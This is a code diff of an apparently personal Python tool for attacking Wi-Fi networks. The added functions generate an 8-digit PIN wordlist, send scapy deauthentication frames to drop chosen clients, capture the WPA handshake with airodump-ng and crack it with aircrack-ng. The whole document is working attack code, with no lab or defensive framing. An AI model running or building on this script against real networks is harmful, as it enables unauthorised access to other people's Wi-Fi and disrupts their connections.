@@ -2,10 +2,7 @@ import os
 import subprocess
 import re
 import time
-import hashlib
-import hmac
-import binascii
-from threading import Threadfrom pbkdf2 import PBKDF2
+import shutil
 from scapy.all import *
 from scapy.layers.dot11 import *
 
@@ -22,26 +19,25 @@ def teardown_network()->None:
     subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout = subprocess.DEVNULL)
 
 def get_iface()->str:
-    print(f"Getting interface")
     try:
         result = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
         for line in result.stdout.splitlines():
             if 'mon' in line:
                 match = re.search(r'^\d+:\s+([^:]+):', line)
                 if match:
-                    print(f"Got iface: {match.group(1).strip()}")
                     return match.group(1).strip()
     except Exception as e:
         print(f"[-] Error: {e}")
     return None
 
 def get_local_devices() -> list:
+    subprocess.run(['ping', '-c', '3', '192.168.0.100'], stdout=subprocess.DEVNULL)
     result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
     lines = result.stdout.splitlines()
     for i, line in enumerate(lines):
         print(f"{i}. {line}")
 
-    selection = input("[*] List the clients you want removed: ")  
+    selection = input("[!] List the clients you want removed: ")  
     selected_indices = [int(x.strip()) for x in selection.split(',')]
     bssids = []
     for idx in selected_indices:
@@ -51,46 +47,119 @@ def get_local_devices() -> list:
                 bssids.append(match.group(1))
     return bssids
 
-class HandshakeCracker:
-    def __init__(self, interface:str):
-        self.interface = interface
-        self.from_frames = 0
-        self.to_frames =0
-        self.capture_handshake = False
-        self.ap_filter = ""
-        self.handshake_file = ""
+def generate_wordlist() -> str:
+    filename = "TP-Link-Pins.txt"
+    if os.path.exists(filename):
+        return filename
+    with open(filename, 'w') as f:
+        for i in range(100000000):
+            f.write(f"{i:08d}\n")
+    print(f"Created {filename} with pins")
+    return filename
+
+def send_deauth(bssid: str, client_list:list, channel: int)-> None:
+    i_face = get_iface()
+    subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
+    for client in client_list:
+        print(f"Sending 35 deauth requests to {client} with bssid: {bssid}")
+        dot11 = Dot11(addr1=client, addr2=bssid,addr3=bssid)
+        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+        sendp(packet, inter=0.1, count=35, iface=i_face, verbose=1)
+
+def capture_handshake(bssid: str, channel: int, ssid: str, client_list: list)-> str:
+
+    i_face = get_iface()
+
+    os.makedirs('./handshake', exist_ok=True)
+    capture_file = f"./handshake/handshake-{ssid}-{bssid.replace(':', '')}"
     
-    def generate_wordlists() -> None:
-        print("Work on later")
-
-    def send_deauth(bssid: str, client_list:list, channel: int)-> None:
-        i_face = get_iface()
-        subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
-        for client in client_list:
-            print(f"Sending 35 deauth requests to {client} with bssid: {bssid}")
-            dot11 = Dot11(addr1=client, addr2=bssid,addr3=bssid)
-            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-            sendp(packet, inter=0.1, count=35, iface=i_face, verbose=1)
-
-    def check_for_handshake(self, packet) ->bool:
-        if EAPOL in packet and ((str(packet.addr2) == self.ap_filter) or (str(packet.addr1) == self.ap_filter)):
-            pktdump = PcapWriter(self.handshake_file, append=True, sync=True)
-            pktdump.write(packet)
-
-            TO_DS = 0x01
-            to_ds (packet.Fcfield & TO_DS) !=0
-
-            if to_ds:
-                self.to_frames +=1
-                print(f"[+] AP -> Client ({self.to_frames}/2)")
-            else:
-                self.from_frames +=1
-                print(f"[+] Client -> AP ({self.from_frames}/2)")
-            
-            #Since we are trying to crack the PIN from the 4 way handshake we need to capture all 4 frames
-            if self.to_frames >=2 and self.from_frames >=2:
-                self.captured_handshake = True
-                return True
-            return False
+    subprocess.run(['killall', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
+    airodump_cmd = ['airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', capture_file, '--output-format', 'pcap', i_face]
     
+    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(3)
+    
+    send_deauth(bssid, client_list, channel)
+    
+    print(f"Giving client time to reconnect...")
+    time.sleep(15)
+    handshake_detected = False
+    cap_file = f"{capture_file}-01.cap"
+    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
+        try:
+            packets = rdpcap(cap_file)
+            eapol_count = sum(1 for p in packets if EAPOL in p)
+            if eapol_count >= 4:
+                handshake_detected = True
+                print(f"[+] Handshake detected! ({eapol_count} EAPOL packets)")
+        except:
+            pass
+        
+    airodump_proc.terminate()
+    time.sleep(2)
+    
+    if handshake_detected:
+        cap_file = f"{capture_file}-01.cap"
+        print(f"[+] Handshake captured successfully!")
+        print(f"[+] Saved to: {cap_file}")
+        return cap_file
+    else:
+        print("[-] No handshake detected")
+        return None
+
+def crack_handshake_aircrack(pcap_file: str, wordlist: str) -> str:
+    print(f"\n[*] Attempting to crack the SSID Pin now, this might take a while...")
+    print(f"[*] Wordlist: {wordlist}")
+    
+    cmd = ['aircrack-ng', '-w', wordlist, pcap_file]
+    
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        output = result.stdout + result.stderr
+
+        for line in output.splitlines():
+            if 'KEY FOUND' in line or 'PASSWORD' in line.upper():
+                match = re.search(r'\[\s*([^\]]+)\s*\]', line)
+                if match:
+                    password = match.group(1).strip()
+                    return password
+            elif 'Password:' in line or 'passphrase:' in line.lower():
+                match = re.search(r'Password:\s*(\S+)|passphrase:\s*(\S+)', line, re.IGNORECASE)
+                if match:
+                    password = match.group(1) or match.group(2)
+                    print(f"[+] PASSWORD FOUND: {password}")
+                    return password
+        
+        print(output)
+        print("\n[-] Password not found in wordlist")
+        return None
+        
+    except subprocess.TimeoutExpired:
+        print("[-] aircrack-ng timed out")
+        return None
+    except Exception as e:
+        print(f"[-] Error running aircrack-ng: {e}")
+        return None
+
+def handshake_attack(bssid: str, channel: int, ssid: str, client_list: list, wordlist_path: str) -> str:
+    print(f"\n{'='*60}")
+    print(f"Starting Handshake Attack on {ssid}")
+    print(f"{'='*60}\n")
+    
+    setup_network()
+    
+    i_face = get_iface()
+    
+    pcap_file = capture_handshake(bssid, channel, ssid, client_list)
+    
+    if not pcap_file:
+        print("[-] Handshake capture failed")
+        teardown_network()
+        return None
+    
+    password = crack_handshake_aircrack(pcap_file, wordlist_path)
+
+    teardown_network()
+    shutil.rmtree('handshake')
+    return password
